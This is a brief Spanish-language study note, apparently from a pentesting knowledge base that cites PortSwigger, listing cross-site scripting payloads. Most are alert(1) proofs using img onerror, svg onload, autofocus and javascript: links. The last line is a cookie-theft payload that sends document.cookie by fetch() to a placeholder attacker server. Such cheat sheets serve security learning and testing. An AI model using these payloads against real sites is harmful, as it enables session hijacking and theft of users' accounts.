Detalles teóricos de Port Swigger en [[Index XSS]]

Si puedes inyectar dentro de atributos `src`, `alt`, etc.:
```java
<img src=x onerror=alert(1)>
```

Carga en formularios ocultos:
```java
<input type="text" value="XSS" onfocus=alert(1) autofocus>
```

Si la aplicación permite inyectar SVG:
```java
<svg onload=alert(1)>
```

Carga en JavaScript inline:
```java
<a href="javascript:alert(1)">Click aquí</a>
```

Robo de cookie por XSS:
```java
fetch('https://tu-servidor.com/log?cookie=' + document.cookie);
```